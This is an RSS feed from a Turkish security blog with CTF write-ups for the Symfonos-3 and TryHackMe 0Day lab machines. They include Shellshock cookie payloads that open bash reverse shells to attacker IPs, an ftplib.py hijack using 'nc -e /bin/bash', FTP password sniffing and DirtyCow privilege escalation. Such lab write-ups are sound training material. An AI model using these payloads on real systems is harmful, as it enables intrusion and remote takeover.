<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Cyber Security Blog</title>
        <link>https://barcode91.github.io/posts/</link>
        <description>Recent content in Posts on Cyber Security Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>tr</language>
        <lastBuildDate>Tue, 10 Nov 2020 20:17:56 +0300</lastBuildDate>
        <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>VULNHUB Symfonos-3 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-3-write-up/</link>
            <pubDate>Tue, 10 Nov 2020 20:17:56 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-3-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Vulnhub &amp;lsquo;da yer alan Symfonos-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Nmap ile port ve servis taraması yapılır.
sudo nmap -sV -sC -p- 192.168.56.122  Ftp servisi anonymous erişime açık değildir. Ayrıca servis sürümünde çalışan bir exploit bulunamamıştır.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/symfonos-31,332/">Vulnhub</a> &lsquo;da yer alan Symfonos-3  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nmap ile port ve servis taraması yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.122
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Ftp servisi anonymous erişime açık değildir. Ayrıca servis sürümünde çalışan bir exploit bulunamamıştır. Bilgi toplama işlemine 80. porttan devam edilir.</p>

    <img src="/images/vulnhub/symfonos3/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Gobuster aracı ile web dizininde tarama gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">gobuster dir -u http://192.168.56.122 -w /usr/share/wordlists/dirb/big.txt
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/g1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>/gate</em> dizinine gidilir. Dizinde yapılan tarama sonucunda bir bilgi elde edilememektedir.</p>

    <img src="/images/vulnhub/symfonos3/website2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Keşif işlemine <em><strong>/cgi-bin</strong></em> dizini ile devam edilir. Daha büyük bir wordlist ile dizin taraması yapıldığında underworld dizini tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.122/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">50</span>
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/g2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>/cgi-bin/underworld</strong></em> sayfasına istek atıldığında zaman bilgisi ve cpu kullanım durumunu gösteren bir sayfa görülmektedir.</p>

    <img src="/images/vulnhub/symfonos3/underworld.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>/cgi-bin dizinine çalışan bir uygulama olması akıllara hemen shellshock zafiyetini getirmektedir. Hemen burpsuite ile sayfa test edilir.</em></p>
<pre><code>Cookie: () { :;}; echo;echo &quot;test&quot;
</code></pre>
    <img src="/images/vulnhub/symfonos3/sh1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Cookie ile gönderilen komutların çalıştırıldığı görülmektedir. Reverse shell bağlantısı için gerekli düzenlemeler yapılır.</p>
<pre><code>Cookie: () { :;}; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1
</code></pre><p>
    <img src="/images/vulnhub/symfonos3/sh2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<br>

    <img src="/images/vulnhub/symfonos3/cerberu.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />

</p>
<p>LinEnum betiği çalıştırılarak sistem hakkında bilgi toplanılır. İşlem sonucunda <strong>tcpdump</strong> aracının root yetkisi ile çalıştırılabildiği görülmektedir.</p>

    <img src="/images/vulnhub/symfonos3/getcap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>tcpdump aracı ile loopback arayüzünde 21. porttan yapılan iletişim dinlenir. Ftp protokolü clear text olarak haberleşme sağladığından paket içeriklerini okumak kolay olmaktadır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">tcpdump -i lo -n port 21
</code></pre></div><pre><code>tcpdump -i lo -n port 21
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
13:22:01.471858 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [S], seq 3896082630, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 0,nop,wscale 7], length 0
13:22:01.471873 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [S.], seq 558047581, ack 3896082631, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 221098,nop,wscale 7], length 0
13:22:01.471886 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 1, win 342, options [nop,nop,TS val 221098 ecr 221098], length 0
13:22:01.474934 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 1:56, ack 1, win 342, options [nop,nop,TS val 221099 ecr 221098], length 55: FTP: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
13:22:01.475029 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.475380 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 12: FTP: USER hades
13:22:01.475391 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [.], ack 13, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.476653 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 221100 ecr 221099], length 33: FTP: 331 Password required for hades
13:22:01.476747 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 221100 ecr 221100], length 23: FTP: PASS PTpZTfU4vxgzvRBE
13:22:01.490197 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 89:115, ack 36, win 342, options [nop,nop,TS val 221102 ecr 221100], length 26: FTP: 230 User hades logged in
13:22:01.490404 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 36:51, ack 115, win 342, options [nop,nop,TS val 221102 ecr 221102], length 15: FTP: CWD /srv/ftp/
13:22:01.491515 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 115:143, ack 51, win 342, options [nop,nop,TS val 221103 ecr 221102], length 28: FTP: 250 CWD command successful
13:22:01.495524 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [F.], seq 51, ack 143, win 342, options [nop,nop,TS val 221104 ecr 221103], length 0
13:22:01.495852 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [F.], seq 143, ack 52, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
13:22:01.495870 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 144, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
</code></pre><p>İşlem sonucunda <strong>hades</strong> kullanıcısına ait hesap bilgileri elde edilir. <code>PASS PTpZTfU4vxgzvRBE</code> Elde edilen parola ile ssh bağlantısı sağlanır.</p>
<pre><code>ssh hades@192.168.56.122
</code></pre><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Hades kullanıcısı ile LinEnum betiği çalıştırıldığında yetki yükseltme için herhangi bir bilgi elde edilemektedir. <em>İlk olarak hades kullanıcısına ait tüm dosyalar tespit edilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cerberus@symfonos3:/home$ find / -user hades -type f 2&gt;/dev/null
/srv/ftp/statuscheck.txt
/home/hades/.bashrc
/home/hades/.profile
/home/hades/.bash_logout
/home/hades/.wget-hsts
</code></pre></div><p><em>Daha sonra hades grubunun erişime açık olan dosyalar tespit edilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -group hades -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/hadesgr.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><strong>/opt/ftpclient</strong> dizini altında bir python dosyası dikkat çekmektedir. İlk olarak dosya içeriğine göz atılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib

ftp <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>)
ftp<span style="color:#f92672">.</span>login(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hades&#39;</span>, passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;PTpZTfU4vxgzvRBE&#39;</span>)

ftp<span style="color:#f92672">.</span>cwd(<span style="color:#e6db74">&#39;/srv/ftp/&#39;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/client/statuscheck.txt&#39;</span>
    ftp<span style="color:#f92672">.</span>storbinary(<span style="color:#e6db74">&#39;STOR &#39;</span><span style="color:#f92672">+</span>filename, open(filename, <span style="color:#e6db74">&#39;rb&#39;</span>))
    ftp<span style="color:#f92672">.</span>quit()

upload()
</code></pre></div><p>tcpdump ile yakaladığımız trafiğe sebep olan uygulama olduğu görülmektedir. ftplib kütüphanesine kod enjeckte ederek yetki yükseltilir. <em>(Yetki yükseltme işlemi kütüphane dosyası root yetkisinde olmasından kaynaklıdır.)</em> İlk olarak kütüphanenin dizini tespit edilir.</p>

    <img src="/images/vulnhub/symfonos3/libsearch.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>gods</strong> grubuna üye kullanıcıların dosya üzerinde yazma yetkisi bulunmaktadır. <code>id</code> komutu ile üye olduğumuz grupları kontrol ettiğimizde hades kullanıcısının gods grubuna üye olduğu görülmektedir.</em></p>

    <img src="/images/vulnhub/symfonos3/id.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Komutlar sıra ile girilerek ftplib.py dosyası içeriği shell alacak şekilde değiştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;import os&#34;</span> &gt; ftplib.py
echo <span style="color:#e6db74">&#39;os.system(&#34;/bin/nc -e /bin/bash 192.168.56.105 3333&#34;)&#39;</span> &gt;&gt; ftplib.py
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/ftplib.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nc ile 3333 numaralı port dinlenir. Ftpclient.py dosyası çalıştırıldığında hata olmasına rağmen terminal bağlantısı sağlanır.</p>
<p>
    <img src="/images/vulnhub/symfonos3/run.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<br>

    <img src="/images/vulnhub/symfonos3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />

</p>
<p>/root dizini altında yer alan proof.txt dosyası görüntülenerek makina çözümleme işlemi tamamlanır.</p>

    <img src="/images/vulnhub/symfonos3/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah’a emanet olun…</em></p>
]]></content>
        </item>
        
        <item>
            <title>THM 0Day Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/thm-0day-write-up/</link>
            <pubDate>Sun, 08 Nov 2020 14:58:36 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/thm-0day-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki 0Day adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Nmap ile port taraması gerçekleştirilir.
sudo nmap -sV -sC 10.10.119.248  Keşif işlemine 80 portunda çalışan web servis üzerinden devam edilir.
Web sayfası kaynak kodunda herhangi bir bilgi elde edilememektedir. Gobuster ile dizin taraması gerçekleştirilir.
gobuster dir -u http://10.10.119.248/ -w /usr/share/wordlists/dirb/big.txt -t 10  Epey ilginç dizinler tespit edilmektedir. /admin, /uploads, /cgi-bin dizinlerine tarayıcı ile istek atıldığında boş sayfa ile karşılaşılmaktadır.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/0day">0Day</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile port taraması gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sudo nmap -sV -sC 10.10.119.248
</code></pre></div>
    <img src="/images/thm/0Day/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Keşif işlemine 80 portunda çalışan web servis üzerinden devam edilir.</p>

    <img src="/images/thm/0Day/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Web sayfası kaynak kodunda herhangi bir bilgi elde edilememektedir. Gobuster ile dizin taraması gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">gobuster dir -u http://10.10.119.248/ -w /usr/share/wordlists/dirb/big.txt -t 10
</code></pre></div>
    <img src="/images/thm/0Day/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Epey ilginç dizinler tespit edilmektedir. <em><strong>/admin, /uploads, /cgi-bin</strong></em> dizinlerine tarayıcı ile istek atıldığında boş sayfa ile karşılaşılmaktadır.</p>
<p>Robots.txt sayfası:</p>

    <img src="/images/thm/0Day/robots.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>secret sayfası:</p>

    <img src="/images/thm/0Day/secret.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Backup sayfasında ssh private anahtarı yer almaktadır. Ama malesef anahtar encrypt edilmiş halde olduğundan decrypt edilmeden kullanıamaz. Şimdilik keşif aşamasında devam edilir.</p>

    <img src="/images/thm/0Day/backuppage.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>/cgi-bin</strong></em> dizini dikkatleri celbetmektedir. Nikto ile web sayfası taranır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">nikto --url http://10.10.119.248/ 
</code></pre></div><p>Tarama sonucunda <em><strong>shellshock</strong></em> zafiyeti tespit edilmiştir. <em>Zafiyet kısaca hedef sistemde web sayfaları tarafından gönderilen shell komutlarını çalıştırmayı sağlamaktadır. (GNU Bash Remote Code Execution Güvenlik Açığı)</em></p>

    <img src="/images/thm/0Day/nikto.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Burada zafiyete sebep olan test.cgi dosyası burpsuite aracı kullanılarak ilk etapta test edilir.</p>

    <img src="/images/thm/0Day/shellshock1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Görüldüğü üzere yapılan isteğe &ldquo;hello Word&rdquo; cevabı döndürmektedir. Zafiyet http başlığındaki cookie, useragent gibi parametler manipüle edilerek sömürülebilir. Burada cookie bilgisi kullanılarak zafiyet sömürülmektedir.</p>
<p>Http başlığına Cookie bilgisi eklenerek test edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Cookie: () { :;}; echo;echo &#34;test&#34;
</code></pre></div>
    <img src="/images/thm/0Day/shellshock2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Hedef sistemde kod çalıştırılabildiği tespit edilmektedir. Reverse shell bağlantısını sağlayacak shell komutu cookie bilgisine eklenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Cookie: () { :;}; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.9.62.67/4444 0&gt;&amp;1
</code></pre></div>
    <img src="/images/thm/0Day/shellshock3.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nc ile dinlenen porta terminal bağlantısı gerçekleşir.</p>

    <img src="/images/thm/0Day/reverseshell.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>/home dizini altında yer alan kullanıcı dizinleri kontrol edilir. Ryan dizini altında user.txt dosyası okunur.</p>

    <img src="/images/thm/0Day/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Hedef sistemde hakkında bilgi toplamak üzere LinEnum.sh betiği çalıştırılır. Betik sonucunda kernel sürümünün eski olduğu tespit edilir.</p>
<p>Bu kernel sürümününde yetki yükseltmek üzere kullanılabailecek exploitleri tespit etmek için   <a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a> betiği çalıştırılır. <em>(Betiklerin localden hedef sisteme nasıl atılacağı ile ilgili eski write-uplara bakabilirsiniz.)</em></p>
<pre><code>www-data@ubuntu:/tmp$ chmod +x suggester.sh
chmod +x suggester.sh
www-data@ubuntu:/tmp$ ./suggester.sh
./suggester.sh

Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL&lt;=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
</code></pre><p>Epey bir uzun çıktı vermektedir. Burada yer alan tüm explotler hedef sistemde çalışmaya bilmektedir. Bazı açıklar path edilmiş olabilmektedir. En dikkat çeken açık ilk sırada yer alan ve epey meşhur olan DirtyCow&rsquo;dur. <em>(DirtyCow hakkında daha fazla bilgi için <a href="https://canyoupwn.me/tr-dirtycow/">https://canyoupwn.me/tr-dirtycow/</a>)</em></p>
<p>DirtyCow kullanılarak yetki yükseltmemizi sağlayacak olan <a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">CowRoot.c</a> dosyası indirilir. Hedef sistemde derlenerek çalıştırılır.</p>
<pre><code>gcc dirtycow.c -o root -pthread
./root
</code></pre>
    <img src="/images/thm/0Day/priv.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>/root dizini altında yer alan root.txt dosyası okunarak makina çözümü tamamlanır.</p>

    <img src="/images/thm/0Day/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah&rsquo;a emanet olun&hellip;</p>
]]></content>
        </item>
        
        <item>
            <title>THM The Server From Hell Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</link>
            <pubDate>Wed, 04 Nov 2020 21:49:09 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki The Server From Hell adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
